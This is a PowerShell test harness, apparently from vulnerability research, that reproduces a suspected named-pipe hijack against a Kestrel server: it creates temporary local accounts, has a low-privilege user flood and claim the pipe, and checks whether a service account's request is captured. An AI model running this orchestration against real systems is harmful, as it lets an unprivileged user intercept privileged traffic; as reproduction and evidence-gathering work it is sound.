param(
  [Parameter(Mandatory = $true)][string]$Sdk,
  [Parameter(Mandatory = $true)][string]$Tfm,
  [Parameter(Mandatory = $true)][string]$Executable,
  [int]$Repeats = 3
)

$ErrorActionPreference = 'Stop'
Set-StrictMode -Version Latest

$repoRoot = (Resolve-Path (Join-Path $PSScriptRoot '../..')).Path
$evidenceRoot = Join-Path $repoRoot 'evidence'
New-Item -ItemType Directory -Force -Path $evidenceRoot | Out-Null

$exe = Join-Path $repoRoot "research/namedpipe-residual/bin/Release/$Tfm/$Executable"
if (-not (Test-Path -LiteralPath $exe)) {
  throw "probe missing: $exe"
}

$suffix = ([Guid]::NewGuid().ToString('N')).Substring(0, 8)
$svcUser = "zdbsvc$suffix"
$lowUser = "zdblow$suffix"
$password = "Zdb!${suffix}xA7#29"
$secure = ConvertTo-SecureString $password -AsPlainText -Force
$svcCredential = [pscredential]::new("$env:COMPUTERNAME\$svcUser", $secure)
$lowCredential = [pscredential]::new("$env:COMPUTERNAME\$lowUser", $secure)
$root = "C:\zdbnp-$suffix"
New-Item -ItemType Directory -Force -Path $root | Out-Null

function Wait-PathExact([string]$Path, [int]$Seconds = 30) {
  $deadline = [DateTime]::UtcNow.AddSeconds($Seconds)
  while ([DateTime]::UtcNow -lt $deadline) {
    if (Test-Path -LiteralPath $Path) { return $true }
    Start-Sleep -Milliseconds 100
  }
  return $false
}

function Start-UserProcess(
  [pscredential]$Credential,
  [string[]]$Arguments,
  [string]$Stdout,
  [string]$Stderr
) {
  $argumentLine = ($Arguments | ForEach-Object {
    if ($_ -match '[\s\"]') { '"' + ($_ -replace '"', '\"') + '"' } else { $_ }
  }) -join ' '

  return Start-Process -FilePath $exe -ArgumentList $argumentLine -Credential $Credential `
    -WorkingDirectory $repoRoot -LoadUserProfile -WindowStyle Hidden -PassThru `
    -RedirectStandardOutput $Stdout -RedirectStandardError $Stderr
}

function Wait-ExitExact([System.Diagnostics.Process]$Process, [int]$Seconds, [string]$Name) {
  if (-not $Process.WaitForExit($Seconds * 1000)) {
    try { Stop-Process -Id $Process.Id -Force -ErrorAction SilentlyContinue } catch { }
    throw "$Name did not exit within $Seconds seconds"
  }
  $Process.Refresh()
  return $Process.ExitCode
}

$matrix = @()
try {
  & net.exe user $svcUser $password /add /y | Out-Null
  if ($LASTEXITCODE -ne 0) { throw 'failed to create service user' }
  & net.exe user $lowUser $password /add /y | Out-Null
  if ($LASTEXITCODE -ne 0) { throw 'failed to create low user' }

  $svcAcl = "$env:COMPUTERNAME\${svcUser}:(OI)(CI)F"
  $lowAcl = "$env:COMPUTERNAME\${lowUser}:(OI)(CI)F"
  $runnerAcl = "${env:USERNAME}:(OI)(CI)F"
  & icacls.exe $root /inheritance:r /grant:r $svcAcl $lowAcl $runnerAcl |
    Out-File -Encoding utf8 (Join-Path $evidenceRoot "icacls-$Sdk.txt")
  if ($LASTEXITCODE -ne 0) { throw 'icacls failed' }

  $lowSid = ([System.Security.Principal.NTAccount]::new($env:COMPUTERNAME, $lowUser)).Translate([System.Security.Principal.SecurityIdentifier]).Value
  $svcSid = ([System.Security.Principal.NTAccount]::new($env:COMPUTERNAME, $svcUser)).Translate([System.Security.Principal.SecurityIdentifier]).Value

  [ordered]@{
    sdk = $Sdk
    framework = $Tfm
    machine = $env:COMPUTERNAME
    serviceUser = $svcUser
    serviceSid = $svcSid
    lowUser = $lowUser
    lowSid = $lowSid
    probeSha256 = (Get-FileHash -Algorithm SHA256 -LiteralPath $exe).Hash.ToLowerInvariant()
    executedUtc = [DateTimeOffset]::UtcNow
  } | ConvertTo-Json | Set-Content -Encoding utf8 (Join-Path $evidenceRoot "environment-$Sdk.json")

  for ($repeat = 1; $repeat -le $Repeats; $repeat++) {
    $state = Join-Path $root "r$repeat"
    New-Item -ItemType Directory -Force -Path $state | Out-Null
    $pipe = "zdb-kestrel-$suffix-$repeat"
    $stop = Join-Path $state 'stop.txt'
    $release = Join-Path $state 'release.txt'

    $server = $null
    $flood = $null
    $claim = $null
    try {
      $server = Start-UserProcess $svcCredential @('server', $pipe, $state, $lowSid, $stop) `
        (Join-Path $state 'server.stdout.txt') (Join-Path $state 'server.stderr.txt')
      if (-not (Wait-PathExact (Join-Path $state 'host-ready.json') 40)) {
        throw "server did not become ready repeat $repeat"
      }

      $pre = Start-UserProcess $lowCredential @('claim', $pipe, $state, 'pre', $svcSid, '5') `
        (Join-Path $state 'pre.stdout.txt') (Join-Path $state 'pre.stderr.txt')
      $preRc = Wait-ExitExact $pre 15 'pre-claim'
      if (-not (Wait-PathExact (Join-Path $state 'claim-pre.json') 5)) {
        throw "pre-claim receipt missing repeat $repeat"
      }
      $preReceipt = Get-Content -Raw (Join-Path $state 'claim-pre.json') | ConvertFrom-Json
      if ($preRc -ne 0 -or [bool]$preReceipt.success) {
        throw "pre-claim control failed repeat $repeat rc=$preRc success=$($preReceipt.success)"
      }

      $flood = Start-UserProcess $lowCredential @('flood', $pipe, $state, $release) `
        (Join-Path $state 'flood.stdout.txt') (Join-Path $state 'flood.stderr.txt')
      if (-not (Wait-PathExact (Join-Path $state 'flood-ready.json') 60)) {
        throw "flood receipt missing repeat $repeat"
      }
      $floodReady = Get-Content -Raw (Join-Path $state 'flood-ready.json') | ConvertFrom-Json

      $claim = Start-UserProcess $lowCredential @('claim', $pipe, $state, 'post', $svcSid, '35') `
        (Join-Path $state 'claim.stdout.txt') (Join-Path $state 'claim.stderr.txt')
      Start-Sleep -Milliseconds 300
      Set-Content -Encoding ascii -Path $release -Value 'release'
      $floodRc = Wait-ExitExact $flood 45 'flood'

      $claimReady = Wait-PathExact (Join-Path $state 'claim-post-ready.txt') 35
      $victimRc = -1
      $captured = $false
      $marker = "zdb-marker-$Sdk-r$repeat-$suffix"

      if ($claimReady) {
        $victim = Start-UserProcess $svcCredential @('victim', $pipe, $marker, (Join-Path $state 'victim-response.txt'), '15000') `
          (Join-Path $state 'victim.stdout.txt') (Join-Path $state 'victim.stderr.txt')
        $victimRc = Wait-ExitExact $victim 25 'victim'
        $claimRc = Wait-ExitExact $claim 45 'claim'
        $capturedPath = Join-Path $state 'captured-request.txt'
        if (Test-Path -LiteralPath $capturedPath) {
          $captured = (Get-Content -Raw $capturedPath).Contains($marker, [StringComparison]::Ordinal)
        }
      }
      else {
        $claimRc = Wait-ExitExact $claim 45 'claim'
      }

      Set-Content -Encoding ascii -Path $stop -Value 'stop'
      $serverRc = Wait-ExitExact $server 35 'server'
      $realVictimHit = Test-Path -LiteralPath (Join-Path $state 'real-victim-hit.txt')
      $claimReceipt = $null
      $claimReceiptPath = Join-Path $state 'claim-post.json'
      if (Test-Path -LiteralPath $claimReceiptPath) {
        $claimReceipt = Get-Content -Raw $claimReceiptPath | ConvertFrom-Json
      }

      $row = [ordered]@{
        sdk = $Sdk
        repeat = $repeat
        preClaimBlocked = (-not [bool]$preReceipt.success)
        floodConnected = [int]$floodReady.connected
        floodFailure = $floodReady.failure
        floodExit = $floodRc
        postClaimReady = $claimReady
        postClaimSuccess = if ($null -eq $claimReceipt) { $false } else { [bool]$claimReceipt.success }
        claimExit = $claimRc
        victimExit = $victimRc
        victimRequestCaptured = $captured
        realKestrelVictimHit = $realVictimHit
        serverExit = $serverRc
        exploit = ($claimReady -and $captured -and -not $realVictimHit -and $victimRc -eq 0 -and $claimRc -eq 0)
      }
      $matrix += [pscustomobject]$row
      $row | ConvertTo-Json -Depth 6 | Set-Content -Encoding utf8 (Join-Path $state 'FINAL_RESULT.json')
    }
    finally {
      if ($server -and -not $server.HasExited) {
        try { Set-Content -Encoding ascii -Path $stop -Value 'stop' } catch { }
        try { Stop-Process -Id $server.Id -Force -ErrorAction SilentlyContinue } catch { }
      }
      foreach ($process in @($flood, $claim)) {
        if ($process -and -not $process.HasExited) {
          try { Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue } catch { }
        }
      }
    }
  }

  $matrix | ConvertTo-Json -Depth 6 | Set-Content -Encoding utf8 (Join-Path $evidenceRoot "matrix-$Sdk.json")
  $matrix | Format-Table -AutoSize | Out-String | Set-Content -Encoding utf8 (Join-Path $evidenceRoot "matrix-$Sdk.txt")
  $exploitCount = @($matrix | Where-Object exploit).Count
  $allControls = @($matrix | Where-Object { -not $_.preClaimBlocked }).Count -eq 0
  [ordered]@{
    sdk = $Sdk
    repeats = $matrix.Count
    exploitCount = $exploitCount
    allPreClaimControlsBlocked = $allControls
    verdict = if ($exploitCount -gt 0) { 'CANDIDATE_REPRODUCED' } else { 'NOT_REPRODUCED' }
  } | ConvertTo-Json | Set-Content -Encoding utf8 (Join-Path $evidenceRoot "summary-$Sdk.json")

  $stateEvidence = Join-Path $evidenceRoot "state-$Sdk"
  New-Item -ItemType Directory -Force -Path $stateEvidence | Out-Null
  Copy-Item -LiteralPath (Join-Path $root '*') -Destination $stateEvidence -Recurse -Force
}
finally {
  Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $exe } |
    Stop-Process -Force -ErrorAction SilentlyContinue
  & net.exe user $svcUser /delete 2>$null | Out-Null
  & net.exe user $lowUser /delete 2>$null | Out-Null
  Remove-Item -LiteralPath $root -Recurse -Force -ErrorAction SilentlyContinue
}
